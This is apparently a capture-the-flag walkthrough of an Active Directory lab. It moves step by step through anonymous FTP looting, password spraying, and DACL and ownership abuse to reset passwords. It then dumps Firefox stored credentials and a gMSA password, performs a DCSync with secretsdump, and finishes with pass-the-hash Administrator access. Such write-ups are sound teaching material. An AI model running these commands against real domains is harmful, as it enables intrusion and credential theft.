# StellarComms (Medium)

![image.png](StellarComms%20(Medium)/image.png)

## Objective / Scope

Stellar Communications, a regional telecommunications provider, has retained the Hack Smarter Red Team to conduct a covert internal network penetration test. The client is concerned about the resilience of their internal Active Directory infrastructure against insider threats and compromised VPN endpoints.

Your objective is to simulate a compromised remote worker, pivot through the internal network, and demonstrate the ability to compromise high-value targets (HVTs) without triggering the Blue Team's SOC alerts.

### Initial Access

Our initial access team has successfully established a VPN tunnel into the environment. We have identified a valid username, likely belonging to a new hire or junior staff member.

```
Valid User:
    Username: junior.analyst
    Password: Unknown

```

## Recon and Enumeration

### Rustscan

```bash
PORT      STATE SERVICE       REASON          VERSION
21/tcp    open  ftp           syn-ack ttl 126 Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 09-12-25  11:29AM       <DIR>          Docs
| 09-10-25  11:15AM       <DIR>          IT
|_09-10-25  11:44AM       <DIR>          Pics
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp    open  domain        syn-ack ttl 126 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 126 Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  syn-ack ttl 126 Microsoft Windows Kerberos (server time: 2026-01-31 10:29:20Z)
135/tcp   open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: stellarcomms.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 126
464/tcp   open  kpasswd5?     syn-ack ttl 126
593/tcp   open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 126
3268/tcp  open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: stellarcomms.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 126
3389/tcp  open  ms-wbt-server syn-ack ttl 126 Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: STELLARCOMMS
|   NetBIOS_Domain_Name: STELLARCOMMS
|   NetBIOS_Computer_Name: DC-STELLAR
|   DNS_Domain_Name: stellarcomms.local
|   DNS_Computer_Name: DC-STELLAR.stellarcomms.local
|   Product_Version: 10.0.17763
|_  System_Time: 2026-01-31T10:30:29+00:00
|_ssl-date: 2026-01-31T10:30:49+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=DC-STELLAR.stellarcomms.local
| Issuer: commonName=DC-STELLAR.stellarcomms.local
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-01-14T20:49:24
| Not valid after:  2026-07-16T20:49:24
| MD5:     60b7 e7b5 e059 9638 3b29 0c74 26c7 feb8
| SHA-1:   505d 8c3a b2b5 85aa 8166 55c6 53d9 1af4 058a 83aa
| SHA-256: aafc f7d0 561b ca6f 21e5 4fc7 d7eb ce27 045d 773e 4cd2 6201 9d45 0979 6c3f a56d

5985/tcp  open  http          syn-ack ttl 126 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack ttl 126 .NET Message Framing
47001/tcp open  http          syn-ack ttl 126 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49670/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49675/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49676/tcp open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49682/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49683/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49724/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49725/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC

```

- ftp-anon: `Anonymous FTP login allowed` (FTP code 230)
- commonName=`DC-STELLAR.stellarcomms.local`

### Enumerating FTP

```bash
ftp anonymous@10.0.27.30
```

![image.png](StellarComms%20(Medium)/image%201.png)

- use `mget *.txt mget *.pdf` to download all the files

![image.png](StellarComms%20(Medium)/image%202.png)

![image.png](StellarComms%20(Medium)/image%203.png)

- We discovered an installer file `Firefox Setup 91.0esr.exe` in the `IT` folder on the FTP server.
- Legitimate software you can download and inspect (e.g., for version/vuln info/credential hunting).
- Lets inspect the files we found

![image.png](StellarComms%20(Medium)/image%204.png)

![image.png](StellarComms%20(Medium)/image%205.png)

- We discovered a Default password in `Stellar_UserGuide.pdf` file
- We can test the password against the user `junior.analyst`

![image.png](StellarComms%20(Medium)/image%206.png)

- There credentials are valid

Generating host files 

```bash
nxc smb 10.0.27.30 -u junior.analyst -p 'REDACTED' --generate-hosts-file hosts

```

![image.png](StellarComms%20(Medium)/image%207.png)

- Added to `etc/hosts`

### Enumerating users

- As a best practice, we can enumerate for other users since `IPC$` has read permissions to it
    
    ```bash
    nxc smb stellarcomms.local  -u junior.analyst -p 'REDACTED' --rid-brute | grep 'SidTypeUser' > names.txt
    
    nxc smb stellarcomms.local   -u junior.analyst -p 'REDACTED' --rid-brute | grep 'SidTypeUser'
    
    nxc smb stellarcomms.local   -u junior.analyst -p 'REDACTED' --users
    
    ```
    
    ![image.png](StellarComms%20(Medium)/image%208.png)
    
    - We enumerated for other users
    - we can perform a  password spraying attack  against the discovered  users with the password we found in one of the pdf.
        
        ```bash
        nxc smb 10.0.27.30  -u users.txt -p 'REDACTED' --continue-on-success
        ```
        
        ![image.png](StellarComms%20(Medium)/image%209.png)
        
        - Only user `junior.analyst` can authenticate with the password.
    
    ## Bloodhound
    
    We can use the provided creds `junior.analyst:REDACTED` to obtain the loot
    
    ```bash
    nxc ldap DC-STELLAR.stellarcomms.local -u 'junior.analyst' -p 'REDACTED' --bloodhound --collection All --dns-server 10.0.27.30
    ```
    
    ![image.png](StellarComms%20(Medium)/image%2010.png)
    

### Bloodhound enumeration

There is a lot we can find and do with bloodhound. My to-do is as below for quick wins

- Check All domain Admins
- Check for all Kerberoastable user accounts
- Find Shortest path to admin

![image.png](StellarComms%20(Medium)/image%2011.png)

- The user `JUNIOR.ANALYST@STELLARCOMMS.LOCAL` has the ability to modify the owner of the group `STELLAROPS-CONTROL@STELLARCOMMS.LOCAL.`
    
    ```bash
    owneredit.py -action write \
      -new-owner junior.analyst \
      -target stellarops-control \
      'stellarcomms.local/junior.analyst:REDACTED'
    
    #Modifying the rights 
    dacledit.py -action 'write' -rights 'WriteMembers' -principal 'junior.analyst' -target-dn 'CN=STELLAROPS-CONTROL,CN=USERS,DC=STELLARCOMMS,DC=LOCAL' 'stellarcomms.local/junior.analyst:REDACTED'
    
    #Adding to the group 
    net rpc group addmem "stellarops-control" "junior.analyst" -U 'stellarcomms.local'/'junior.analyst'%'REDACTED' -S "DC-STELLAR.stellarcomms.local"
    
    #verify that the user was successfully added to the group:
    net rpc group members "stellarops-control" -U 'stellarcomms.local'/'junior.analyst'%'REDACTED' -S "DC-STELLAR.stellarcomms.local"
    ```
    
    ![image.png](StellarComms%20(Medium)/image%2012.png)
    
    ![image.png](StellarComms%20(Medium)/image%2013.png)
    
    ![image.png](StellarComms%20(Medium)/image%2014.png)
    
    ![image.png](StellarComms%20(Medium)/image%2015.png)
    

![image.png](StellarComms%20(Medium)/image%2016.png)

- The members of the group `STELLAROPS-CONTROL@STELLARCOMMS.LOCAL` have the capability to change the user `OPS.CONTROLLER@STELLARCOMMS.LOCAL's` password without knowing that user's current password.
    
    ```bash
    net rpc password "ops.controller" "RedBlue777" -U 'stellarcomms.local'/'junior.analyst'%'REDACTED' -S "DC-STELLAR.stellarcomms.local"
    ```
    
    ![image.png](StellarComms%20(Medium)/image%2017.png)
    

![image.png](StellarComms%20(Medium)/image%2018.png)

- The user `OPS.CONTROLLER@STELLARCOMMS.LOCAL` is a member of the group `REMOTE MANAGEMENT USERS@STELLARCOMMS.LOCAL.`
    
    ```bash
    evil-winrm -u ops.controller -i 10.0.27.30 -p "RedBlue777"
    
    gci C:\ -Include 'user.txt' -File -Recurse -ErrorAction SilentlyContinue | % { "=== $($_.FullName) ==="; gc -Raw -Encoding UTF8 $_.FullName }
    ```
    
    ![image.png](StellarComms%20(Medium)/image%2019.png)
    

![image.png](StellarComms%20(Medium)/image%2020.png)

- There is  an installer for `Firefox Setup 91.0esr.exe` and  we could try now is to extract the browser credentials.
- In Firefox, **saved credentials are not stored in plaintext**. They’re split across **two files `logins.json` and `key4.db`**
- The links below can be of reference

https://reliaquest.com/blog/browser-credential-dumping/

https://fourcore.io/blogs/threat-hunting-browser-credential-stealing

https://pentestlab.blog/2024/08/20/web-browser-stored-credentials/

![image.png](StellarComms%20(Medium)/image%2021.png)

- We can try using `LaZagne.exe`

```bash
dir C:\Users\ops.controller /s /b /a | findstr /i "logins.json key4.db"

C:\Users\ops.controller\AppData\Local\Mozilla\Firefox\Profiles\
dir "C:\Users\ops.controller\AppData\Roaming\Mozilla\Firefox\Profiles" -Force

dir "C:\Users\ops.controller\AppData\Roaming\Mozilla\Firefox\Profiles\*\logins.json" -Force
dir "C:\Users\ops.controller\AppData\Roaming\Mozilla\Firefox\Profiles\*\key4.db" -Force

```

![image.png](StellarComms%20(Medium)/image%2022.png)

```bash
cd "C:\Users\ops.controller\AppData\Roaming\Mozilla\Firefox\Profiles\v8mn7ijj.default-esr"
download logins.json
download key4.db

download "C:/Users/ops.controller/AppData/Roaming/Mozilla/Firefox/Profiles/v8mn7ijj.default-esr/logins.json"
download "C:/Users/ops.controller/AppData/Roaming/Mozilla/Firefox/Profiles/v8mn7ijj.default-esr/key4.db"
```

![image.png](StellarComms%20(Medium)/image%2023.png)

[https://github.com/lclevy/firepwd](https://github.com/lclevy/firepwd) 

[https://github.com/lclevy/firepwd](https://github.com/lclevy/firepwd)

![image.png](StellarComms%20(Medium)/image%2024.png)

![image.png](StellarComms%20(Medium)/image%2025.png)

- We now have a set of credential `astro.researcher:'REDACTED'`
- We can spray the password amongst all the users
    
    ```bash
    nxc smb 10.0.27.30  -u users.txt -p 'REDACTED' --continue-on-success
    ```
    
    ![image.png](StellarComms%20(Medium)/image%2026.png)
    

## Bloodhound Continuation

![image.png](StellarComms%20(Medium)/image%2027.png)

- The user `ASTRO.RESEARCHER@STELLARCOMMS.LOCAL` has permissions to modify the DACL (Discretionary Access Control List) on the user `ENG.PAYLOAD@STELLARCOMMS.LOCAL`
    
    ```bash
    dacledit.py -action 'write' -rights 'FullControl' -principal 'astro.researcher' -target 'ENG.PAYLOAD' 'stellarcomms.local'/'astro.researcher':'REDACTED'
    
    bloodyAD \
      --host DC-STELLAR.stellarcomms.local \
      -d stellarcomms.local \
      -u astro.researcher \
      -p 'Cosmos@42' \
      set password ENG.PAYLOAD 'RedBlue777!'
    
    ```
    
    ![image.png](StellarComms%20(Medium)/image%2028.png)
    
    ![image.png](StellarComms%20(Medium)/image%2029.png)
    

![image.png](StellarComms%20(Medium)/image%2030.png)

- `SATLINK-SERVICE$@STELLARCOMMS.LOCAL` is a Group Managed Service Account. The user `ENG.PAYLOAD@STELLARCOMMS.LOCAL` can retrieve the password for the `GMSA SATLINK-SERVICE$@STELLARCOMMS.LOCAL.`
    
    ```bash
    gMSADumper.py -u 'SATLINK-SERVICE' -p 'RedBlue777!' -d 'stellarcomms.local'
    ```
    
    [https://github.com/micahvandeusen/gMSADumper](https://github.com/micahvandeusen/gMSADumper)
    
    ```bash
    bloodyAD \
      -d stellarcomms.local \
      -u ENG.PAYLOAD \
      -p 'RedBlue777!' \
      --host 10.0.27.30 \
      get object SATLINK-SERVICE$ --attr msDS-ManagedPassword
    
    ```
    
    ![image.png](StellarComms%20(Medium)/image%2031.png)
    

![image.png](StellarComms%20(Medium)/image%2032.png)

- The user `SATLINK-SERVICE$@STELLARCOMMS.LOCAL` has the DS-Replication-Get-Changes-All permission on the domain STELLARCOMMS.LOCAL.
- Individually, this edge does not grant the ability to perform an attack. However, in conjunction with DS-Replication-Get-Changes, a principal may perform a `DCSync attack.`

```bash
secretsdump.py -just-dc \
  stellarcomms.local/'SATLINK-SERVICE$'@10.0.27.30 \
  -hashes :'REDACTED'
```

![image.png](StellarComms%20(Medium)/image%2033.png)

```bash
evil-winrm -i 10.0.27.30 -u Administrator -H 'REDACTED'
```

```bash
gci C:\ -Include 'root.txt' -File -Recurse -ErrorAction SilentlyContinue | % { "=== $($_.FullName) ==="; gc -Raw -Encoding UTF8 $_.FullName }
```

![image.png](StellarComms%20(Medium)/image%2034.png)